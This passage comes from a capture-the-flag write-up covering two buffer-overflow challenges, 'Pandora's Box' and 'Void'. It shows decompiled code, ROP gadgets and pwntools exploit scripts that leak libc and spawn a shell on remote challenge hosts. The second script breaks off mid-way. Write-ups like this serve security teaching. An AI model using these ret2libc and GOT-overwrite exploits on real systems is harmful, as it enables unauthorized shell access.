+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">s&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">];&lt;/span> &lt;span class="c1">// [rsp+0h] [rbp-30h] BYREF
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kr">__int64&lt;/span> &lt;span class="n">v2&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [rsp+8h] [rbp-28h]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kr">__int64&lt;/span> &lt;span class="n">v3&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [rsp+10h] [rbp-20h]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kr">__int64&lt;/span> &lt;span class="n">v4&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [rsp+18h] [rbp-18h]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span> &lt;span class="kt">unsigned&lt;/span> &lt;span class="kr">__int64&lt;/span> &lt;span class="n">num&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="c1">// [rsp+28h] [rbp-8h]
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">*&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_QWORD&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">s&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0LL&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v2&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0LL&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v3&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0LL&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">v4&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0LL&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fwrite&lt;/span>&lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;This is one of Pandora&amp;#39;s mythical boxes!&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;Will you open it or Return it to the Library for analysis?&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;1. Open.&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;2. Return.&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;&amp;gt;&amp;gt; &amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">1uLL&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mh">0x7EuLL&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">_bss_start&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">num&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nf">read_num&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">(&lt;/span> &lt;span class="n">num&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="mi">2&lt;/span> &lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fprintf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">_bss_start&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;%s&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">WHAT HAVE YOU DONE?! WE ARE DOOMED!&lt;/span>&lt;span class="se">\n\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\x1B&lt;/span>&lt;span class="s">[1;31m&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1312&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fwrite&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">Insert location of the library: &amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">1uLL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x21uLL&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">_bss_start&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">fgets&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">256&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">stdin&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nf">fwrite&lt;/span>&lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s">We will deliver the mythical box to the Library for analysis, thank you!&lt;/span>&lt;span class="se">\n\n&lt;/span>&lt;span class="s">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">1uLL&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="mi">75uLL&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">_bss_start&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>A classic buffer overflow exploitation. Howerver, this time there was no win function to print out the flag so we had to get a shell using ret2libc technique. The binary has no Canary nor PIE enable so we didn&amp;rsquo;t need to leak anything other than the libc address.&lt;/p>
+&lt;p>Using gdb we knew that the offset from our input buffer to the return address of &lt;em>box()&lt;/em> is 56 bytes long.&lt;/p>
+&lt;p>Our 1st ROP chain would be to leak the address of the &lt;em>puts()&lt;/em> function from the GOT table using the &lt;em>puts()&lt;/em> function itself.&lt;/p>
+&lt;p>The 2nd ROP chain was used to call the &lt;em>system()&lt;/em> function from the libc with the argument string being &amp;ldquo;/bin/sh&amp;rdquo;. I didn&amp;rsquo;t use &lt;a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">one_gadget&lt;/a> since none of the provided gadgets worked.&lt;/p>
+&lt;p>The other gadgets such as &lt;em>pop rdi ; ret&lt;/em> you can get them using &lt;a href="https://github.com/JonathanSalwan/ROPgadget" target="_blank" rel="noopener">ROPgadget&lt;/a> or &lt;a href="https://github.com/sashs/Ropper" target="_blank" rel="noopener">Ropper&lt;/a>&lt;/p>
+&lt;p>Here&amp;rsquo;s the exploit script.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-py" data-lang="py">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">exe&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ELF&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./pb&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">libc&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ELF&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;./libc.so.6&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">remote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;68.183.37.122&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">30673&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#io = exe.process()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#gdb.attach(io, api=True)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Gadgets:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">pad&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;i&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">56&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">pop_rdi&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x000000000040142b&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">binsh&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x1d8698&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ret&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x00000000004013a5&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 1st chain leak libc&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s1">&amp;gt;&amp;gt; &amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;2&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;library: &amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">pad&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pop_rdi&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">exe&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">got&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;puts&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">exe&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">plt&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;puts&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">exe&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sym&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;main&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;thank you!&lt;/span>&lt;span class="se">\n\n&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">leak_puts&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">u64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">keepends&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">False&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ljust&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\x00&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">leak_puts&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sym&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;puts&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 2nd chain get shell&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s1">&amp;gt;&amp;gt; &amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;2&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvuntil&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;library: &amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">hex&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sym&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;system&amp;#39;&lt;/span>&lt;span class="p">]))&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">pad&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ret&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">pop_rdi&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">address&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">binsh&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sym&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;system&amp;#39;&lt;/span>&lt;span class="p">])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">sendline&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">io&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;img src="pandora.png" alt="Never gonna give you up" width="1000"/>
+&lt;p>Flag is: &lt;strong>HTB{r3turn_2_P4nd0r4?!}&lt;/strong>&lt;/p>
+&lt;h2 id="void">Void&lt;/h2>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>Given file:&lt;/strong> &lt;a href="">Get it here!&lt;/a>&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Description:&lt;/strong> The room goes dark and all you can see is a damaged terminal. Hack into it to restore the power and find your way out.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Note:&lt;/strong> This challenge had a docker but it might be closed at the time you are reading this. All needed files will be given in the write-ups.&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Category:&lt;/strong> Binary Exploitation/Pwnable&lt;/p>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Difficulty:&lt;/strong> Medium&lt;/p>
+&lt;/li>
+&lt;/ul>
+&lt;p>The program is simple, buffer overflow occurs in function &lt;code>vuln&lt;/code>, here is the pseudocode of &lt;code>vuln&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">ssize_t&lt;/span> &lt;span class="nf">vuln&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kt">char&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">64&lt;/span>&lt;span class="p">];&lt;/span> &lt;span class="c1">// [rsp+0h] [rbp-40h] BYREF
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0xC8uLL&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>I found a similar write-up for this challenge &lt;a href="https://nandynarwhals.org/cyberpeace-2022-crysys/" target="_blank" rel="noopener">here&lt;/a>. The main idea is to ultilize ROP gadgets to spawn a shell, there is an interesting gadget allows us to modify memory by adding a 32 bit value to that memory, let call this &lt;code>add_gadget&lt;/code>.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">$ ROPgadget --binary void &lt;span class="p">|&lt;/span> grep &lt;span class="s2">&amp;#34;ebx&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x0000000000401108 : add dword ptr &lt;span class="o">[&lt;/span>rbp - 0x3d&lt;span class="o">]&lt;/span>, ebx &lt;span class="p">;&lt;/span> nop dword ptr &lt;span class="o">[&lt;/span>rax + rax&lt;span class="o">]&lt;/span> &lt;span class="p">;&lt;/span> ret
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Our attack plan&lt;/p>
+&lt;ul>
+&lt;li>Stage 1 store string &amp;ldquo;/bin/sh&amp;rdquo; in &lt;code>.bss&lt;/code> section.&lt;/li>
+&lt;li>Stage 2 change &lt;code>read@GOT&lt;/code> to &lt;code>system@GOT&lt;/code> by adding an offset between &lt;code>read@GOT&lt;/code> and &lt;code>system@GOT&lt;/code>.&lt;/li>
+&lt;li>Stage 3 call &lt;code>read@plt&lt;/code> with &lt;code>/bin/sh&lt;/code>.&lt;/li>
+&lt;/ul>
+&lt;p>Our used gadgets in exploit script&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">rdi = 0x00000000004011bb : pop rdi ; ret
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">rsi_r15 = 0x00000000004011b9 : pop rsi ; pop r15 ; ret
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">add_gadget = 0x0000000000401108 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">gadget = 0x00000000004011b2 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here is the exploit script&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">from&lt;/span> &lt;span class="nn">pwn&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="o">*&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">context&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">arch&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;amd64&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">remote&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;138.68.162.218&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">30569&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># p = process(&amp;#39;./void&amp;#39;)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">libc_elf&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ELF&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;./libc.so.6&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">elf&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">ELF&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;./void&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">read_got&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">elf&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">got&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;read&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">libc_system&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">libc_elf&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">symbols&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;system&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">libc_read&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">libc_elf&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">symbols&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;read&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">system_offset&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">libc_system&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">libc_read&lt;/span>
